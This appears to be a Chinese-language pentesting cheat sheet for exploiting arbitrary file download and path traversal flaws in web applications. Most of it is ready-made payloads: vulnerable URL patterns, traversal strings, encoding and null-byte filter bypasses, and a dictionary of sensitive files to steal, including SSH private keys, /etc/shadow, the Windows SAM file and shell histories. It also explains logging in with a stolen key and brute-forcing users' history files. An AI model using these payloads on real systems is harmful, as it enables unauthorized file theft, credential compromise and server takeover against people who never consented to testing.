重点关注url中有以下这类关键词的
download.php?url=  
download.php?path=  
download.php?file=  
down.php?file=  
readfife.php?file=  
read.php?filename=  


例如：    
download.php?file=../../../../etc/passwd  
download.php?file==file:///etc/passwd  
download.php?file==file:/etc/passwd  


https://www.xxxx.com/download.php?file=xxx.php    可能存在漏洞

https://www.xxxx.com/download.php/file/xxx.php    不太可能存在漏洞  
主要是看 “?”

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
常见读取的敏感文件路径  
Windos  
C:\boot.ini //查看系统版本  
C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件  
C:\Windows\repair\sam //存储系统初次安装的密码  
C:\Program Files\mysql\my.ini //Mysql配置  
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root  
C:\Windows\php.ini //php配置信息  
C:\Windows\my.ini //Mysql配置信息  
......  


Linux  
/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去


/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub     //私钥文件如果没有设定密码保护，便可直接获取到进行登录到服务器，或使用xshell等软件选择证书登录。ssh -i id_rsa root@IP地址  
字典  
/root/.ssh/id_rsa  
/root/.ssh/id_ed25519  
/root/.ssh/id_dsa  
/home/www-data/.ssh/id_rsa  
/home/ubuntu/.ssh/id_ed25519  



/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥  
/root/.ssh/known_hosts   //ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。  



/etc/passwd // 账户信息  
/etc/shadow // 账户密码文件  
/etc/redis.conf #redis配置文件  
/etc/my.cnf //mysql 配置文件
/etc/httpd/conf/httpd.conf // Apache配置文件  
/etc/redhat-release 系统版本   
/root/.bash_history //用户历史命令记录文件  
/root/.mysql_history //mysql历史命令记录文件  
/var/lib/mlocate/mlocate.db //全文件路径 利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息
locate mlocate.db config把包含config的路径全输出出来locate mlocate.db webappslocate mlocate.db www获取到路径后可以进一步挖掘敏感信息和系统漏洞


/proc/self/fd/fd[0-9]*(文件标识符)  
/proc/mounts //记录系统挂载设备  
/porc/config.gz //内核配置文件  
/porc/self/cmdline //当前进程的cmdline参数  
/proc/sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid  
/proc/pid/cmdline   则可以看到对应pid进程的完整命令行。  
/proc/net/fib_trie   内网IP  
/proc/self/environ   环境变量  
/proc/self/loginuid   当前用户  
/etc/ssh/sshd_config 重要文件可以构造密钥  
/proc/self/cwd/ 工作目录(可以根据内容继续构造)  
/proc/self/tomcat/根据回显继续读取  
......

--------------------------------------------------------------------------------------
主要看绕过技巧


可以进行fuzz

url编码代替.或者/，如使用%2F代替/  
?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd  
二次编码(%25)  
?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd  
加入+  
?filename=.+./.+./bin/redacted.dll  
%00  
?filename=.%00./file.php  
/etc/passwd%00.jpg  
\  
?filename=..%5c..%5c/windows/win.ini  
Java %c0%ae 安全模式绕过  
?filename=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd  

---------------------------------
其中Linux用户目录常见敏感文件  
.bash_history  
.zsh_history  
.psql_history  
.mysql_history  
.profile  
.bashrc  
.gitconfig  
.viminfo  


任意文件读取/etc/passwd  
提取passwd第一列，即root等一系列用户名  


读history：../../root/.bash_history  
暴破所有用户的.bash_history：../../../home/§root§/.bash_history  

------------------------------------------
<img width="1232" height="1135" alt="image" src="https://github.com/user-attachments/assets/46f4e613-4187-409a-864b-90fb43dab514" />



